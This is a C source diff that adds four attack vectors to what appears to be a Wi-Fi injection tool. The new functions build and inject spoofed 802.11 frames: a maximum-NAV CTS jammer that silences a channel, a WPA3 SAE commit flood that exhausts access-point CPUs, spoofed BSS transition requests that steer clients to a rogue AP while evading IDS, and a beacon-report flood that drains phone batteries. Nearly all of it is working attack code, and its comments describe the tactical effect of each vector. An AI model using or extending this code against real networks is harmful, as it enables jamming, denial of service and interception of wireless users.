@@ -165,6 +165,10 @@ typedef enum {
   VEC_POWER_SAVE,
   VEC_FRAGATTACK,
   VEC_DFS_FAKE_RADAR,
+  VEC_CTS_NAV_JAMMER,
+  VEC_SAE_HUNTING,
+  VEC_BSS_TRANSITION,
+  VEC_BEACON_REPORT_DRAIN,
   VEC_COUNT
 } attack_vector_t;
 
@@ -175,6 +179,10 @@ static const char *VEC_NAMES[] = {
     "Probe Response CSA",  "DELBA Attack",      "Evil Twin Handoff",
     "TKIP/GCMP MIC Error", "Power Save DoS",    "FragAttack Injection",
     "Operating Channel Aggression",
+    "CTS/RTS Virtual Jammer",
+    "WPA3 SAE Hunting",
+    "BSS Transition (802.11v)",
+    "Beacon Report Drain",
 };
 
 typedef enum {
@@ -514,6 +522,7 @@ static const uint8_t BCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 #define FC_DEAUTH 0x00C0
 #define FC_DISASSOC 0x00A0
 #define FC_ACTION 0x00D0
+#define FC_CTS 0x00C4     /* Control: Clear To Send */
 #define FC_DATA_TODS 0x0108 /* [FIX 5] Data frame with ToDS */
 
 /* [FIX 4] TX_FLAGS = NOACK(0x0008) | NOSEQ(0x0010) */
@@ -1101,6 +1110,267 @@ static int mk_dfs_vacate_csa(uint8_t *b, const uint8_t bss[6], const char *ssid,
 }
 
 /* ============================================================
+ *  CTS/RTS Virtual Jammer — Vector #17
+ *
+ *  Transmits spoofed Clear-To-Send (CTS) control frames with
+ *  the Duration/NAV field set to maximum (32767 µs).
+ *
+ *  All 802.11-compliant devices hearing this CTS will update
+ *  their NAV (Network Allocation Vector) and remain silent
+ *  for the declared duration, causing Virtual Jamming across
+ *  the entire frequency without disrupting physical connections.
+ *
+ *  Highly effective against robust routers (e.g. Huawei) that
+ *  are resilient to Deauth/Disassoc but still honor NAV timing.
+ *
+ *  CTS frame format (IEEE 802.11-2020 §9.3.1.3):
+ *    FC (2) + Duration (2) + RA (6) = 10 bytes (+ FCS by HW)
+ * ============================================================ */
+static int mk_cts_nav(uint8_t *b, const uint8_t ra[6]) {
+  int o = 0;
+  o += mk_rt(b + o);
+
+  /* CTS is a Control frame — only has RA, no addr2/addr3 in the
+     standard format. We build it manually instead of mk_dot11. */
+  uint16_t fc = htole16(FC_CTS);
+  memcpy(b + o, &fc, 2);
+  o += 2;
+
+  /* Duration/NAV: maximum value = 32767 µs (bit 15 = 0, bits 14:0 = max) */
+  uint16_t dur = htole16(32767);
+  memcpy(b + o, &dur, 2);
+  o += 2;
+
+  /* Receiver Address (RA) — broadcast to silence everyone */
+  memcpy(b + o, ra, 6);
+  o += 6;
+
+  return o;
+}
+
+/* ============================================================
+ *  WPA3 SAE Hunting & Puzzling — Vector #18
+ *
+ *  Floods SAE (Simultaneous Authentication of Equals) Commit
+ *  frames with random source MACs. Each SAE Commit forces the
+ *  AP to perform a computationally expensive Elliptic Curve
+ *  Diffie-Hellman (ECDH) "hunting-and-pecking" operation to
+ *  derive the Password Element (PWE).
+ *
+ *  Tactical effect: AP CPU saturates at 100% from continuous
+ *  cryptographic puzzle computation, causing hang/crash
+ *  (Crypto Puzzle Exhaustion / CVE-2019-9494 Dragonblood).
+ *
+ *  SAE Commit (IEEE 802.11-2020 §12.4):
+ *    Auth frame: algo=SAE(3), seq=1, status=0
+ *    Body: Group ID (2) + Scalar (32) + Element (64)
+ * ============================================================ */
+static int mk_sae_commit(uint8_t *b, const uint8_t bss[6],
+                          const uint8_t cli[6]) {
+  int o = 0;
+  o += mk_rt(b + o);
+  /* Client → AP: addr1=BSSID, addr2=Client, addr3=BSSID */
+  o += mk_dot11(b + o, FC_AUTH, bss, cli, bss, 0);
+
+  /* Authentication Algorithm: SAE (3) */
+  uint16_t algo = htole16(3);
+  memcpy(b + o, &algo, 2);
+  o += 2;
+
+  /* Auth Transaction Sequence: 1 (Commit) */
+  uint16_t txseq = htole16(1);
+  memcpy(b + o, &txseq, 2);
+  o += 2;
+
+  /* Status Code: 0 (Success / requesting commit) */
+  uint16_t status = htole16(0);
+  memcpy(b + o, &status, 2);
+  o += 2;
+
+  /* SAE Commit Body:
+   * Finite Cyclic Group: 19 (secp256r1 / NIST P-256) */
+  uint16_t group = htole16(19);
+  memcpy(b + o, &group, 2);
+  o += 2;
+
+  /* Anti-Clogging Token: empty (first commit, no token yet) */
+
+  /* Scalar (32 bytes) — random to force unique PWE derivation per frame */
+  static __thread xorshift64_t sae_rng;
+  static __thread bool sae_rng_init = false;
+  if (!sae_rng_init) {
+    xs64_seed(&sae_rng);
+    sae_rng_init = true;
+  }
+  for (int i = 0; i < 32; i += 8) {
+    uint64_t r = xs64_next(&sae_rng);
+    memcpy(b + o + i, &r, i + 8 <= 32 ? 8 : (size_t)(32 - i));
+  }
+  o += 32;
+
+  /* Element (64 bytes: x-coord 32 + y-coord 32) — random */
+  for (int i = 0; i < 64; i += 8) {
+    uint64_t r = xs64_next(&sae_rng);
+    memcpy(b + o + i, &r, i + 8 <= 64 ? 8 : (size_t)(64 - i));
+  }
+  o += 64;
+
+  return o;
+}
+
+/* ============================================================
+ *  BSS Transition Attack (802.11v Steer) — Vector #19
+ *
+ *  Sends a spoofed BSS Transition Management Request (Action
+ *  frame) pretending to originate from the legitimate AP,
+ *  directing connected clients to roam to a rogue BSSID.
+ *
+ *  The frame includes a Neighbor Report IE containing the
+ *  spoofed target BSSID with fabricated BSSID Information
+ *  indicating superior signal/conditions, and sets the
+ *  Disassociation Imminent bit to pressure immediate roaming.
+ *
+ *  Tactical effect: silent, non-disruptive client steering
+ *  to a Rogue AP without triggering IDS alarms.
+ *
+ *  Reference: IEEE 802.11-2020 §11.22 (BSS Transition Mgmt)
+ *             Category=10 (WNM), Action=7 (BTM Request)
+ * ============================================================ */
+static int mk_bss_transition(uint8_t *b, const uint8_t bss[6],
+                              const uint8_t cli[6]) {
+  int o = 0;
+  o += mk_rt(b + o);
+  /* AP → Client: addr1=Client, addr2=BSSID, addr3=BSSID */
+  o += mk_dot11(b + o, FC_ACTION, cli, bss, bss, 0);
+
+  /* Category: WNM (10) */
+  b[o++] = 10;
+  /* Action: BSS Transition Management Request (7) */
+  b[o++] = 7;
+  /* Dialog Token */
+  b[o++] = 1;
+
+  /* Request Mode:
+   *   bit 0: Preferred Candidate List Included = 1
+   *   bit 2: Disassociation Imminent = 1
+   *   => 0x05 */
+  b[o++] = 0x05;
+
+  /* Disassociation Timer: 10 TBTTs (~1 second at 100 TU interval) */
+  uint16_t disassoc_timer = htole16(10);
+  memcpy(b + o, &disassoc_timer, 2);
+  o += 2;
+
+  /* Validity Interval: 20 TBTTs */
+  b[o++] = 20;
+
+  /* BSS Termination Duration: not included (bit 3 = 0) */
+
+  /* --- Neighbor Report IE (ID=52) --- */
+  b[o++] = 52;  /* Element ID: Neighbor Report */
+  b[o++] = 13;  /* Length: BSSID(6) + BSSID Info(4) + OpClass(1) + Channel(1) + PhyType(1) */
+
+  /* Target BSSID: a spoofed BSSID (randomized per call via caller) */
+  uint8_t rogue_bssid[6];
+  rand_mac(rogue_bssid);
+  memcpy(b + o, rogue_bssid, 6);
+  o += 6;
+
+  /* BSSID Information (4 bytes):
+   *   bit 0: AP Reachable = 1
+   *   bit 1: Security compatible = 1
+   *   bit 2: Key Scope match = 1
+   *   bit 4: Spectrum Mgmt capable = 1
+   *   => 0x00000017 */
+  uint32_t bssid_info = htole32(0x00000017);
+  memcpy(b + o, &bssid_info, 4);
+  o += 4;
+
+  /* Operating Class: 81 (2.4 GHz channels 1-13) */
+  b[o++] = 81;
+  /* Channel Number: 6 (common default) */
+  b[o++] = 6;
+  /* PHY Type: 7 (HT) */
+  b[o++] = 7;
+
+  return o;
+}
+
+/* ============================================================
+ *  Beacon Report Drain (Battery Exploitation) — Vector #20
+ *
+ *  Sends Radio Measurement Request (Action frame) demanding
+ *  the target device perform a continuous Beacon Report scan
+ *  across ALL channels/operating classes. The target's radio
+ *  must exit doze state and perform active/passive scanning
+ *  on every frequency band.
+ *
+ *  Tactical effect: drains mobile device battery at extreme
+ *  speed due to non-stop background scanning, causes thermal
+ *  throttling and potential device shutdown.
+ *
+ *  Reference: IEEE 802.11-2020 §11.11.8 (Beacon Report)
+ *             Category=5 (Radio Measurement), Action=0 (Req)
+ * ============================================================ */
+static int mk_beacon_report_req(uint8_t *b, const uint8_t bss[6],
+                                 const uint8_t cli[6], uint8_t cur_ch) {
+  int o = 0;
+  o += mk_rt(b + o);
+  /* AP → Client: addr1=Client, addr2=BSSID, addr3=BSSID */
+  o += mk_dot11(b + o, FC_ACTION, cli, bss, bss, 0);
+
+  /* Category: Radio Measurement (5) */
+  b[o++] = 5;
+  /* Action: Radio Measurement Request (0) */
+  b[o++] = 0;
+  /* Dialog Token */
+  b[o++] = 1;
+  /* Number of Repetitions: 65535 (maximum — repeat forever) */
+  uint16_t reps = htole16(0xFFFF);
+  memcpy(b + o, &reps, 2);
+  o += 2;
+
+  /* --- Measurement Request IE (ID=38) --- */
+  b[o++] = 38;  /* Element ID: Measurement Request */
+  b[o++] = 14;  /* Length */
+  b[o++] = 1;   /* Measurement Token */
+  /* Request Mode:
+   *   bit 1: Enable = 1
+   *   bit 3: Report = 1  (demand immediate report)
+   *   => 0x0A */
+  b[o++] = 0x0A;
+  /* Measurement Type: 5 (Beacon Report) */
+  b[o++] = 5;
+
+  /* --- Beacon Report subelement --- */
+  /* Operating Class: 81 (global 2.4 GHz) — scan all 2.4GHz */
+  b[o++] = 81;
+  /* Channel Number: 0 = scan ALL channels in this operating class */
+  b[o++] = 0;
+
+  /* Randomization Interval: 0 (start immediately) */
+  uint16_t rand_int = htole16(0);
+  memcpy(b + o, &rand_int, 2);
+  o += 2;
+
+  /* Measurement Duration: 1000 TU (~1 second per channel) */
+  uint16_t meas_dur = htole16(1000);
+  memcpy(b + o, &meas_dur, 2);
+  o += 2;
+
+  /* Measurement Mode: 0 = Passive (forces full dwell time per channel) */
+  b[o++] = 0;
+
+  /* BSSID: wildcard (FF:FF:FF:FF:FF:FF) — report ALL APs */
+  memcpy(b + o, BCAST, 6);
+  o += 6;
+
+  (void)cur_ch; /* channel context available for future enhancements */
+
+  return o;
+}
+
+/* ============================================================
  *               PACKET FACTORY
  * ============================================================ */
 
@@ -1127,6 +1397,14 @@ typedef struct {
   /* DFS Fake Radar: Measurement Report + vacate CSA pair */
   pkt_t dfs_radar_report; /* Spectrum Mgmt Measurement Report (Radar bit) */
   pkt_t dfs_vacate_csa;   /* Spoofed AP CSA beacon forcing channel vacation */
+  /* Vector #17: CTS/RTS Virtual Jammer */
+  pkt_t cts_nav;
+  /* Vector #18: WPA3 SAE Hunting (pre-built with random cli, refreshed per-use) */
+  pkt_t sae_commit;
+  /* Vector #19: BSS Transition Attack (802.11v Steer) */
+  pkt_t bss_transition;
+  /* Vector #20: Beacon Report Drain (Battery Exploitation) */
+  pkt_t beacon_report;
 } factory_t;
 
 /* [FIX 10] factory_build checks parse_mac returns */
@@ -1192,6 +1470,18 @@ static bool factory_build(factory_t *f, const target_ap_t *t, int new_ch,
   f->dfs_vacate_csa.len =
       mk_dfs_vacate_csa(f->dfs_vacate_csa.buf, bss, t->ssid, cur_ch, safe);
 
+  /* Vector #17: CTS/RTS Virtual Jammer — broadcast CTS with max NAV */
+  f->cts_nav.len = mk_cts_nav(f->cts_nav.buf, BCAST);
+
+  /* Vector #18: WPA3 SAE Hunting — SAE Commit from random client */
+  f->sae_commit.len = mk_sae_commit(f->sae_commit.buf, bss, cli);
+
+  /* Vector #19: BSS Transition Attack — BTM Request to broadcast */
+  f->bss_transition.len = mk_bss_transition(f->bss_transition.buf, bss, BCAST);
+
+  /* Vector #20: Beacon Report Drain — Measurement Request to broadcast */
+  f->beacon_report.len = mk_beacon_report_req(f->beacon_report.buf, bss, BCAST, cur_ch);
+
   for (int i = 0; i < MAX_AUTH_POOL; i++) {
     uint8_t fm[6];
     rand_mac(fm);
@@ -1255,6 +1545,18 @@ static pkt_set_t factory_get(factory_t *f, attack_vector_t v) {
     /* Radar claim first, then spoofed AP vacation CSA */
     s.p[s.n++] = &f->dfs_radar_report;
     s.p[s.n++] = &f->dfs_vacate_csa;
+    break;
+  case VEC_CTS_NAV_JAMMER:
+    s.p[s.n++] = &f->cts_nav;
+    break;
+  case VEC_SAE_HUNTING:
+    s.p[s.n++] = &f->sae_commit;
+    break;
+  case VEC_BSS_TRANSITION:
+    s.p[s.n++] = &f->bss_transition;
+    break;
+  case VEC_BEACON_REPORT_DRAIN:
+    s.p[s.n++] = &f->beacon_report;
     break;
   /* [FIX 3] Non-injection vectors: handled by other engines */
   case VEC_PMKID_CAPTURE:
@@ -3541,6 +3843,64 @@ static void *stress_injector_thread(void *arg) {
         }
 
         len = mk_dfs_vacate_csa(tmp, bss, ssid, cur, safe);
+        if (inject_one(sock, tmp, len) > 0) {
+          atomic_fetch_add(&g_pkts_sent, 1);
+          sent_for_ap++;
+        } else {
+          atomic_fetch_add(&g_pkts_fail, 1);
+        }
+      }
+
+      /* Vector #17: CTS/RTS Virtual Jammer */
+      if (a->cfg->vec_on[VEC_CTS_NAV_JAMMER]) {
+        /* CTS with max NAV — silence all devices on this frequency */
+        len = mk_cts_nav(tmp, bss);
+        if (inject_one(sock, tmp, len) > 0) {
+          atomic_fetch_add(&g_pkts_sent, 1);
+          sent_for_ap++;
+        } else {
+          atomic_fetch_add(&g_pkts_fail, 1);
+        }
+        /* Also broadcast CTS for wider coverage */
+        len = mk_cts_nav(tmp, BCAST);
+        if (inject_one(sock, tmp, len) > 0) {
+          atomic_fetch_add(&g_pkts_sent, 1);
+          sent_for_ap++;
+        } else {
+          atomic_fetch_add(&g_pkts_fail, 1);
+        }
+      }
+
+      /* Vector #18: WPA3 SAE Hunting & Puzzling */
+      if (a->cfg->vec_on[VEC_SAE_HUNTING]) {
+        /* SAE Commit with random source MAC — each forces ECDH computation */
+        uint8_t fake_cli[6];
+        rand_mac(fake_cli);
+        len = mk_sae_commit(tmp, bss, fake_cli);
+        if (inject_one(sock, tmp, len) > 0) {
+          atomic_fetch_add(&g_pkts_sent, 1);
+          sent_for_ap++;
+        } else {
+          atomic_fetch_add(&g_pkts_fail, 1);
+        }
+      }
+
+      /* Vector #19: BSS Transition Attack (802.11v Steer) */
+      if (a->cfg->vec_on[VEC_BSS_TRANSITION]) {
+        /* BTM Request spoofed from AP → broadcast client */
+        len = mk_bss_transition(tmp, bss, BCAST);
+        if (inject_one(sock, tmp, len) > 0) {
+          atomic_fetch_add(&g_pkts_sent, 1);
+          sent_for_ap++;
+        } else {
+          atomic_fetch_add(&g_pkts_fail, 1);
+        }
+      }
+
+      /* Vector #20: Beacon Report Drain (Battery Exploitation) */
+      if (a->cfg->vec_on[VEC_BEACON_REPORT_DRAIN]) {
+        /* Radio Measurement Request → broadcast to drain all devices */
+        len = mk_beacon_report_req(tmp, bss, BCAST, (uint8_t)snap[i].channel);
         if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
